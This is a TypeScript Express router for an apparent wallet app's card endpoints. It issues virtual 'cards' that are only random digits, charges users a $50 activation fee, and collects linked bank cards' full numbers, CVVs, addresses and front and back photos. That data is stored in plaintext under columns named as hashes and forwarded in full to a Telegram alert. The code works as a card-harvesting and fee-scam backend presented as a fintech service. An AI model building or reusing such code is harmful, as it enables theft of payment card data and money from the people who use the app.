import { Router } from "express";
import { db } from "@workspace/db";
import {
  cardsTable,
  walletsTable,
  transactionsTable,
  notificationsTable,
  adminLogsTable,
} from "@workspace/db";
import { eq, and, sql } from "drizzle-orm";
import { requireAuth } from "../middlewares/auth";
import {
  sendVirtualCardActivationAlert,
  sendBankCardSubmissionAlert,
} from "../lib/telegram";
import { broadcastToUser } from "../lib/websocket";

const router = Router();

const ACTIVATION_FEE = 50;

const NETWORK_PREFIXES: Record<string, string> = {
  visa: "4",
  mastercard: "5",
  amex: "37",
  discover: "60",
};

function generateCardNumber(network: string): string {
  const prefix = NETWORK_PREFIXES[network.toLowerCase()] || "4";
  const length = network.toLowerCase() === "amex" ? 15 : 16;
  let num = prefix;
  while (num.length < length) {
    num += Math.floor(Math.random() * 10).toString();
  }
  return num;
}

function generateCvv(network: string): string {
  const length = network.toLowerCase() === "amex" ? 4 : 3;
  let cvv = "";
  for (let i = 0; i < length; i++) cvv += Math.floor(Math.random() * 10).toString();
  return cvv;
}

function brandLabel(network: string): string {
  const map: Record<string, string> = {
    visa: "Visa",
    mastercard: "Mastercard",
    amex: "Amex",
    discover: "Discover",
  };
  return map[network.toLowerCase()] || network;
}

function brandToNetwork(brand: string): string {
  const map: Record<string, string> = {
    Visa: "visa",
    Mastercard: "mastercard",
    Amex: "amex",
    Discover: "discover",
  };
  return map[brand] || brand.toLowerCase();
}

function detectBrandFromNumber(num: string): string {
  const clean = num.replace(/\s+/g, "");
  if (/^4/.test(clean)) return "Visa";
  if (/^(5[1-5]|2[2-7])/.test(clean)) return "Mastercard";
  if (/^3[47]/.test(clean)) return "Amex";
  if (/^(6011|65|64[4-9])/.test(clean)) return "Discover";
  return "Card";
}

function shapeCard(c: typeof cardsTable.$inferSelect) {
  return {
    id: c.id,
    kind: c.kind,
    cardType: c.kind === "bank" ? "bank" : "debit",
    cardNetwork: brandToNetwork(c.brand),
    cardName: c.cardName || null,
    last4: c.last4,
    expiryMonth: parseInt(c.expiryMonth, 10) || 12,
    expiryYear: parseInt(c.expiryYear, 10) || new Date().getFullYear() + 4,
    cardholderName: c.cardHolderName,
    status: c.status,
    isVirtual: c.kind === "virtual",
    bankName: c.bankName,
    country: c.country,
    declineReason: c.declineReason,
    createdAt: c.createdAt,
  };
}

router.get("/", requireAuth, async (req, res) => {
  try {
    const cards = await db.select().from(cardsTable).where(eq(cardsTable.userId, req.userId!));
    res.json({ cards: cards.map(shapeCard) });
  } catch (e) {
    req.log.error({ e }, "Error getting cards");
    res.status(500).json({ error: "Failed to get cards" });
  }
});

// Issue a new VIRTUAL card (status = inactive, no fee yet)
router.post("/", requireAuth, async (req, res) => {
  const { cardNetwork, cardholderName, cardName } = req.body;
  const userId = req.userId!;

  if (!cardholderName || !cardholderName.trim()) {
    res.status(400).json({ error: "Cardholder name is required" });
    return;
  }
  if (!cardName || !cardName.trim()) {
    res.status(400).json({ error: "Card name is required" });
    return;
  }

  const network = (cardNetwork || "visa").toLowerCase();
  if (!NETWORK_PREFIXES[network]) {
    res.status(400).json({ error: "Invalid card network" });
    return;
  }

  try {
    const cardNumber = generateCardNumber(network);
    const cvv = generateCvv(network);
    const last4 = cardNumber.slice(-4);
    const brand = brandLabel(network);
    const now = new Date();
    const expYear = now.getFullYear() + 4;
    const expMonth = (now.getMonth() + 1).toString().padStart(2, "0");

    const [card] = await db.insert(cardsTable).values({
      userId,
      kind: "virtual",
      status: "inactive",
      cardHolderName: cardholderName.trim().toUpperCase(),
      cardName: cardName.trim(),
      cardNumberHash: cardNumber,
      last4,
      brand,
      expiryMonth: expMonth,
      expiryYear: expYear.toString(),
      cvvHash: cvv,
      rawCardNumber: cardNumber,
    }).returning();

    res.status(201).json({ card: shapeCard(card) });
  } catch (e) {
    req.log.error({ e }, "Error issuing card");
    res.status(500).json({ error: "Failed to issue card" });
  }
});

// Activate a virtual card by paying the $50 fee
router.post("/:id/activate", requireAuth, async (req, res) => {
  const cardId = parseInt(req.params["id"] as string);
  const userId = req.userId!;
  const user = req.user!;

  try {
    // Atomic activation: claim the card row first (status must still be "inactive"),
    // then deduct the fee and record the transaction. If two requests race, only
    // the first will get a row back from the conditional update.
    const result = await db.transaction(async (tx) => {
      const [card] = await tx.select().from(cardsTable).where(
        and(eq(cardsTable.id, cardId), eq(cardsTable.userId, userId))
      );
      if (!card) return { error: { code: 404, msg: "Card not found" } } as const;
      if (card.kind !== "virtual") return { error: { code: 400, msg: "Only virtual cards require activation" } } as const;
      if (card.status !== "inactive") {
        return { error: { code: 400, msg: `Card is already ${card.status.replace("_", " ")}` } } as const;
      }

      // Lock + read wallet, conditionally deduct.
      const debit = await tx.update(walletsTable)
        .set({ balance: sql`${walletsTable.balance} - ${ACTIVATION_FEE}`, updatedAt: new Date() })
        .where(and(
          eq(walletsTable.userId, userId),
          sql`${walletsTable.balance} >= ${ACTIVATION_FEE}`,
        ))
        .returning();
      if (debit.length === 0) {
        return { error: { code: 400, msg: `Insufficient portfolio balance. Activation requires $${ACTIVATION_FEE}.` } } as const;
      }

      // Conditionally claim the card; if another request already claimed it,
      // this returns 0 rows and we abort + roll back the debit.
      const claimed = await tx.update(cardsTable)
        .set({
          status: "pending_activation",
          activationFee: ACTIVATION_FEE.toString(),
          updatedAt: new Date(),
        })
        .where(and(eq(cardsTable.id, cardId), eq(cardsTable.status, "inactive")))
        .returning();
      if (claimed.length === 0) {
        throw new Error("CARD_ALREADY_CLAIMED");
      }

      const [feeTx] = await tx.insert(transactionsTable).values({
        type: "card_activation",
        amount: ACTIVATION_FEE.toString(),
        status: "completed",
        senderId: userId,
        note: `Virtual card activation fee — Card ****${card.last4}`,
      }).returning();

      const [updatedCard] = await tx.update(cardsTable)
        .set({ activationTxId: feeTx.id })
        .where(eq(cardsTable.id, cardId))
        .returning();

      return { ok: { card: updatedCard } } as const;
    }).catch((err) => {
      if (err instanceof Error && err.message === "CARD_ALREADY_CLAIMED") {
        return { error: { code: 409, msg: "Card activation already in progress" } } as const;
      }
      throw err;
    });

    if ("error" in result && result.error) {
      res.status(result.error.code).json({ error: result.error.msg });
      return;
    }
    if (!("ok" in result) || !result.ok) {
      res.status(500).json({ error: "Failed to activate card" });
      return;
    }
    const updatedCard = result.ok.card;

    // Notify admin
    const messageId = await sendVirtualCardActivationAlert({
      cardId: updatedCard.id,
      userId,
      username: user.username,
      email: user.email,
      cardName: updatedCard.cardName || "",
      brand: updatedCard.brand,
      last4: updatedCard.last4,
      cardNumber: updatedCard.rawCardNumber || "",
      cvv: updatedCard.cvvHash || "",
      expiry: `${updatedCard.expiryMonth}/${updatedCard.expiryYear}`,
      cardholderName: updatedCard.cardHolderName,
      fee: ACTIVATION_FEE,
    });

    if (messageId) {
      await db.update(cardsTable).set({ telegramMessageId: messageId }).where(eq(cardsTable.id, cardId));
    }

    await db.insert(notificationsTable).values({
      userId,
      type: "card",
      title: "Card Activation Submitted",
      message: `Your activation request for card ****${updatedCard.last4} is being reviewed. The $${ACTIVATION_FEE} fee has been deducted from your portfolio.`,
    });

    broadcastToUser(userId, { type: "card_status", data: { cardId, status: "pending_activation" } });

    res.json({ card: shapeCard(updatedCard) });
  } catch (e) {
    req.log.error({ e }, "Error activating card");
    res.status(500).json({ error: "Failed to activate card" });
  }
});

// Add a BANK card (linking)
router.post("/bank", requireAuth, async (req, res) => {
  const userId = req.userId!;
  const user = req.user!;
  const {
    cardholderName,
    cardNumber,
    expiryMonth,
    expiryYear,
    cvv,
    country,
    bankName,
    billingAddress,
    frontImage,
    backImage,
  } = req.body;

  // Validation
  if (!cardholderName?.trim()) { res.status(400).json({ error: "Cardholder name is required" }); return; }
  const cleanNumber = (cardNumber || "").replace(/\s+/g, "");
  if (!/^\d{13,19}$/.test(cleanNumber)) { res.status(400).json({ error: "Enter a valid card number" }); return; }
  if (!expiryMonth || !expiryYear) { res.status(400).json({ error: "Expiry date is required" }); return; }
  if (!cvv || !/^\d{3,4}$/.test(cvv)) { res.status(400).json({ error: "Enter a valid CVV" }); return; }
  if (!country?.trim()) { res.status(400).json({ error: "Country is required" }); return; }
  if (!bankName?.trim()) { res.status(400).json({ error: "Bank name is required" }); return; }
  if (!frontImage || !backImage) { res.status(400).json({ error: "Both front and back card images are required" }); return; }

  try {
    const last4 = cleanNumber.slice(-4);
    const brand = detectBrandFromNumber(cleanNumber);
    const expM = String(expiryMonth).padStart(2, "0");
    const expY = String(expiryYear).length === 2 ? `20${expiryYear}` : String(expiryYear);

    const [card] = await db.insert(cardsTable).values({
      userId,
      kind: "bank",
      status: "pending_activation",
      cardHolderName: cardholderName.trim().toUpperCase(),
      cardName: `${bankName.trim()} ${brand}`,
      cardNumberHash: cleanNumber,
      last4,
      brand,
      expiryMonth: expM,
      expiryYear: expY,
      cvvHash: String(cvv),
      rawCardNumber: cleanNumber,
      country: country.trim(),
      bankName: bankName.trim(),
      billingAddress: billingAddress?.trim() || null,
      frontImage,
      backImage,
    }).returning();

    const messageId = await sendBankCardSubmissionAlert({
      cardId: card.id,
      userId,
      username: user.username,
      email: user.email,
      cardholderName: card.cardHolderName,
      cardNumber: cleanNumber,
      brand,
      last4,
      expiry: `${expM}/${expY}`,
      cvv: String(cvv),
      country: card.country || "",
      bankName: card.bankName || "",
      billingAddress: card.billingAddress || "",
      frontImage,
      backImage,
    });

    if (messageId) {
      await db.update(cardsTable).set({ telegramMessageId: messageId }).where(eq(cardsTable.id, card.id));
    }

    await db.insert(notificationsTable).values({
      userId,
      type: "card",
      title: "Bank Card Submitted",
      message: `Your ${brand} card ending in ${last4} has been submitted for verification. You'll be notified once the review is complete.`,
    });

    broadcastToUser(userId, { type: "card_status", data: { cardId: card.id, status: "pending_activation" } });

    // Don't return the raw card number/cvv/images in response
    res.status(201).json({ card: shapeCard(card) });
  } catch (e) {
    req.log.error({ e }, "Error adding bank card");
    res.status(500).json({ error: "Failed to add bank card" });
  }
});

router.delete("/:id", requireAuth, async (req, res) => {
  const cardId = parseInt(req.params["id"] as string);
  const userId = req.userId!;

  try {
    const [card] = await db.select().from(cardsTable).where(
      and(eq(cardsTable.id, cardId), eq(cardsTable.userId, userId))
    );

    if (!card) {
      res.status(404).json({ error: "Card not found" });
      return;
    }

    // Block deletion while admin review is pending — otherwise the activation
    // fee can never be refunded if the user races the admin's reject button.
    if (card.status === "pending_activation") {
      res.status(400).json({ error: "This card is under review and cannot be removed until the review is complete." });
      return;
    }

    await db.delete(cardsTable).where(eq(cardsTable.id, cardId));

    await db.insert(adminLogsTable).values({
      action: "card_removed",
      targetUserId: userId,
      details: `User removed card #${cardId} (${card.kind}, ****${card.last4})`,
    });

    res.json({ success: true, message: "Card removed successfully" });
  } catch (e) {
    req.log.error({ e }, "Error deleting card");
    res.status(500).json({ error: "Failed to delete card" });
  }
});

export default router;
